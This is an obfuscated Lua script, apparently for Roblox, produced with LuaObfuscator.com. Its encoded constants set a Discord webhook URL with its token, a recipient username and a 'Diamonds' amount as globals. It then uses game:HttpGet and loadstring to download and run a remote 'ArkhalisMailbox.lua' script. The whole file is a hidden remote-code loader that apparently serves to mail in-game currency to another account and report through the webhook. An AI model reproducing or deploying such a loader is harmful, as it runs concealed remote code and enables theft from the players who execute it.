--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v68=v2(v0(v30,16));if v19 then local v77=v5(v68,v19);v19=nil;return v77;else return v68;end end end);local function v20(v31,v32,v33)if v33 then local v69=0 -0 ;local v70;while true do if (v69==0) then v70=(v31/((929 -(214 + 713))^(v32-(1 + 0))))%((5 -3)^(((v33-(1 -0)) -(v32-(2 -1))) + (4 -3) + 0)) ;return v70-(v70%((737 -(32 + 85)) -(555 + 64))) ;end end else local v71=(933 -(857 + 74))^(v32-(1066 -(68 + 978 + 19))) ;return (((v31%(v71 + v71))>=v71) and (1271 -(226 + 1044))) or 0 ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + 1 + 1 );v18=v18 + (959 -(892 + 65)) ;return (v36 * 256) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + (7 -(184 -(67 + 113))) );v18=v18 + 4 ;return (v40 * (31011612 -14234396)) + (v39 * ((88222 + 32090) -54776)) + (v38 * (606 -(87 + 263))) + v37 ;end local function v24()local v41=v23();local v42=v23();local v43=2 -1 ;local v44=(v20(v42,1,15 + (15 -10) ) * (2^(127 -95))) + v41 ;local v45=v20(v42,973 -(802 + 150) ,83 -52 );local v46=((v20(v42,57 -25 )==(19 -(10 + 8))) and  -(1 + (0 -0))) or (998 -(915 + (524 -(416 + 26)))) ;if (v45==(0 -0)) then if (v44==(0 + 0)) then return v46 * (0 -(0 -0)) ;else v45=1;v43=1187 -(1069 + 118) ;end elseif (v45==(4643 -2596)) then return ((v44==((0 + 0) -0)) and (v46 * (1/((0 -0) + 0)))) or (v46 * NaN) ;end return v8(v46,v45-(1817 -794) ) * (v43 + (v44/((2 + 0)^(843 -(368 + 423))))) ;end local function v25(v47)local v48;if  not v47 then v47=v23();if (v47==(438 -(145 + 293))) then return "";end end v48=v3(v16,v18,(v18 + v47) -(431 -(44 + 386)) );v18=v18 + v47 ;local v49={};for v66=1, #v48 do v49[v66]=v2(v1(v3(v48,v66,v66)));end return v6(v49);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v50=540 -(537 + 3) ;local v51;local v52;local v53;local v54;local v55;local v56;local v57;local v58;while true do if (v50~=2) then else local v72=1700 -(1419 + 281) ;while true do if (v72==(1 -0)) then v50=77 -(71 + 3) ;break;end if (v72==(0 + 0)) then v55=nil;v56=nil;v72=2 -1 ;end end end if (v50==(3 -0)) then v57=nil;v58=nil;v50=4;end if (v50~=4) then else while true do if (v51==2) then local v95=241 -(187 + 54) ;local v96;while true do if (0==v95) then v96=0;while true do if (v96==(781 -(162 + 618))) then v51=3;break;end if (v96==(0 + 0)) then v56=nil;v57=nil;v96=1;end end break;end end end if (v51~=(2 + 1)) then else v58=nil;while true do local v98=0;local v99;while true do if (v98~=(0 -0)) then else v99=0 -0 ;while true do if (v99~=1) then else if (v52~=0) then else local v158=0;local v159;while true do if ((0 + 0)~=v158) then else v159=1636 -(1373 + 263) ;while true do if (v159==(1001 -(451 + 549))) then v55={};v52=1 + 0 ;break;end if (v159~=(0 -0)) then else local v173=0 -0 ;while true do if (v173~=(1384 -(746 + 638))) then else v53={};v54={};v173=1;end if (v173==1) then v159=1;break;end end end end break;end end end if (v52==(2 + 1)) then local v160=0 -0 ;local v161;while true do if (v160==(341 -(218 + 123))) then v161=1581 -(1535 + 46) ;while true do if (v161==(0 + 0)) then local v174=0;while true do if (v174~=0) then else for v180=1,v23() do v54[v180-1 ]=v28();end return v56;end end end end break;end end end break;end if (v99~=0) then else local v122=0;local v123;while true do if (v122~=0) then else v123=0 + 0 ;while true do if (v123==0) then local v172=0;while true do if (v172~=(561 -(306 + 254))) then else v123=1;break;end if (v172~=(0 + 0)) then else if (v52~=(1 -0)) then else local v175=1467 -(899 + 568) ;local v176;local v177;while true do if (v175==0) then v176=0;v177=nil;v175=1;end if (v175~=(1 + 0)) then else while true do if (0~=v176) then else v177=0;while true do if (v177~=(2 -1)) then else v58={};v52=605 -(268 + 335) ;break;end if ((290 -(60 + 230))~=v177) then else local v186=572 -(426 + 146) ;local v187;while true do if (v186==0) then v187=0 + 0 ;while true do if ((1456 -(282 + 1174))~=v187) then else local v202=811 -(569 + 242) ;while true do if (v202==(2 -1)) then v187=1 + 0 ;break;end if (v202==0) then v56={v53,v54,nil,v55};v57=v23();v202=2 -1 ;end end end if (v187==1) then v177=1 + 0 ;break;end end break;end end end end break;end end break;end end end if (v52==(702 -(271 + 429))) then local v178=0 + 0 ;local v179;while true do if (v178==(1500 -(1408 + 92))) then v179=1086 -(461 + 625) ;while true do if (v179~=(1288 -(993 + 295))) then else local v182=0 + 0 ;while true do if (v182~=(1171 -(418 + 753))) then else for v189=1 + 0 ,v57 do local v190=0 + 0 ;local v191;local v192;while true do if (v190==(1 + 0)) then if (v191==(1 + 0)) then v192=v21()~=(529 -(406 + 123)) ;elseif (v191==2) then v192=v24();elseif (v191==3) then v192=v25();end v58[v189]=v192;break;end if (v190~=(1769 -(1749 + 20))) then else local v200=0;local v201;while true do if (v200==(0 + 0)) then v201=1322 -(1249 + 73) ;while true do if (v201==0) then v191=v21();v192=nil;v201=1;end if ((1 + 0)~=v201) then else v190=1;break;end end break;end end end end end v56[1148 -(466 + 679) ]=v21();v182=2 -1 ;end if (v182==(2 -1)) then v179=1;break;end end end if (v179~=(1901 -(106 + 1794))) then else for v183=1,v23() do local v184=0 + 0 ;local v185;while true do if (v184~=0) then else v185=v21();if (v20(v185,1,1 + 0 )==(0 -0)) then local v193=0;local v194;local v195;local v196;local v197;local v198;while true do if (v193~=(5 -3)) then else v198=nil;while true do if (v194~=1) then else local v203=0;while true do if (v203~=(115 -(4 + 110))) then else v194=586 -(57 + 527) ;break;end if (v203~=0) then else v197=nil;v198=nil;v203=1428 -(41 + 1386) ;end end end if (v194~=(103 -(17 + 86))) then else v195=0;v196=nil;v194=1 + 0 ;end if (v194~=(3 -1)) then else while true do if (v195==(0 -0)) then v196=v20(v185,2,3);v197=v20(v185,170 -(122 + 44) ,6);v195=1;end if (v195~=(1 -0)) then else v198={v22(),v22(),nil,nil};if (v196==0) then local v206=0 + 0 ;local v207;while true do if (v206~=(0 -0)) then else v207=65 -(30 + 35) ;while true do if (v207==0) then v198[3]=v22();v198[3 + 1 ]=v22();break;end end break;end end elseif (v196==1) then v198[3]=v23();elseif (v196==2) then v198[1260 -(1043 + 214) ]=v23() -(2^(60 -44)) ;elseif (v196~=3) then else local v218=1212 -(323 + 889) ;local v219;while true do if (v218==(0 -0)) then v219=580 -(361 + 219) ;while true do if (v219~=0) then else v198[323 -(53 + 267) ]=v23() -((1 + 1)^16) ;v198[417 -(15 + 398) ]=v22();break;end end break;end end end v195=984 -(18 + 964) ;end if (v195==3) then if (v20(v197,3,11 -8 )~=(1 + 0)) then else v198[4]=v58[v198[4]];end v53[v183]=v198;break;end if (v195~=2) then else local v205=0;while true do if (v205~=0) then else if (v20(v197,1,1 + 0 )~=1) then else v198[852 -(20 + 830) ]=v58[v198[2 + 0 ]];end if (v20(v197,2,128 -(116 + 10) )~=1) then else v198[1 + 2 ]=v58[v198[741 -(542 + 196) ]];end v205=1 -0 ;end if (v205==(1 + 0)) then v195=3;break;end end end end break;end end break;end if (v193~=0) then else v194=0;v195=nil;v193=1 + 0 ;end if (v193==1) then v196=nil;v197=nil;v193=2;end end end break;end end end v52=3;break;end end break;end end end v172=1;end end end if (v123==(1 + 0)) then v99=2 -1 ;break;end end break;end end end end break;end end end break;end if (v51==0) then v52=0 -0 ;v53=nil;v51=1;end if (v51~=1) then else local v97=1551 -(1126 + 425) ;while true do if (0~=v97) then else local v104=0;while true do if ((405 -(118 + 287))~=v104) then else v54=nil;v55=nil;v104=3 -2 ;end if ((1122 -(118 + 1003))==v104) then v97=2 -1 ;break;end end end if (v97==(378 -(142 + 235))) then v51=2;break;end end end end break;end if ((0 -0)==v50) then local v73=0;while true do if (1==v73) then v50=1;break;end if (v73~=0) then else v51=0 + 0 ;v52=nil;v73=978 -(553 + 424) ;end end end if (v50~=(1 -0)) then else v53=nil;v54=nil;v50=2 + 0 ;end end end local function v29(v59,v60,v61)local v62=0;local v63;local v64;local v65;while true do if (v62==1) then v65=v59[3];return function(...)local v78=v63;local v79=v64;local v80=v65;local v81=v27;local v82=1;local v83= -1;local v84={};local v85={...};local v86=v12("#",...) -1 ;local v87={};local v88={};for v92=0,v86 do if (v92>=v80) then v84[v92-v80 ]=v85[v92 + 1 ];else v88[v92]=v85[v92 + 1 ];end end local v89=(v86-v80) + 1 ;local v90;local v91;while true do v90=v78[v82];v91=v90[1];if (v91<=5) then if (v91<=2) then if (v91<=0) then local v105=v90[2];local v106,v107=v81(v88[v105](v13(v88,v105 + 1 ,v90[3])));v83=(v107 + v105) -1 ;local v108=0;for v119=v105,v83 do v108=v108 + 1 ;v88[v119]=v106[v108];end elseif (v91==1) then v88[v90[2]][v90[3]]=v90[4];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v61[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]][v90[3]]=v90[4];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v82=v90[3];else v82=v90[3];end elseif (v91<=3) then v88[v90[2]][v90[3]]=v90[4];elseif (v91>4) then v88[v90[2]]=v90[3];else local v133=0;local v134;local v135;while true do if (v133==1) then v88[v134 + 1 ]=v135;v88[v134]=v135[v90[4]];break;end if (0==v133) then v134=v90[2];v135=v88[v90[3]];v133=1;end end end elseif (v91<=8) then if (v91<=6) then local v111=0;local v112;local v113;local v114;local v115;local v116;while true do if (v111==1) then v90=v78[v82];v88[v90[2]]=v61[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v61[v90[3]];v82=v82 + 1 ;v111=2;end if (2==v111) then v90=v78[v82];v116=v90[2];v115=v88[v90[3]];v88[v116 + 1 ]=v115;v88[v116]=v115[v90[4]];v82=v82 + 1 ;v111=3;end if (v111==3) then v90=v78[v82];v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v116=v90[2];v113,v114=v81(v88[v116](v13(v88,v116 + 1 ,v90[3])));v111=4;end if (v111==5) then v88[v116]=v88[v116](v13(v88,v116 + 1 ,v83));v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]();v82=v82 + 1 ;v90=v78[v82];v111=6;end if (v111==6) then v82=v90[3];break;end if (v111==4) then v83=(v114 + v116) -1 ;v112=0;for v162=v116,v83 do local v163=0;while true do if (v163==0) then v112=v112 + 1 ;v88[v162]=v113[v112];break;end end end v82=v82 + 1 ;v90=v78[v82];v116=v90[2];v111=5;end if (v111==0) then v112=nil;v113,v114=nil;v115=nil;v116=nil;v88[v90[2]][v90[3]]=v90[4];v82=v82 + 1 ;v111=1;end end elseif (v91>7) then if (v88[v90[2]]==v90[4]) then v82=v82 + 1 ;else v82=v90[3];end else do return;end end elseif (v91<=9) then local v117=v90[2];v88[v117]=v88[v117](v13(v88,v117 + 1 ,v83));elseif (v91==10) then v88[v90[2]]=v61[v90[3]];else v88[v90[2]]();end v82=v82 + 1 ;end end;end if (v62==0) then v63=v59[1];v64=v59[2];v62=1;end end end return v29(v28(),{},v17)(...);end v15("LOL!0D3O00028O00026O00F03F03023O005F4703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3O31302O38312O38363038393236393330312F6555587678685F7A46794757736232684965674A4C58706F63746946412D6A30756370572O7437464755304D56506F49645F6352434E72506E685366703031636C5A4B68030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403313O00682O7470733A2O2F61726B68616C69736C75612E6769746875622E696F2F41726B68616C69734D61696C626F782E6C756103083O00557365726E616D65030B3O00616468616D4O35343503083O004469616D6F6E6473024O0040772B4100163O0012053O00013O0026083O000D000100020004023O000D000100120A000100033O00300600010004000500122O000100063O00122O000200073O00202O00020002000800122O000400096O000200046O00013O00024O00010001000100044O001500010026083O0001000100010004023O0001000100120A000100033O0030010001000A000B00122O000100033O00302O0001000C000D00124O00023O00044O000100012O00073O00017O00",v9(),...);end
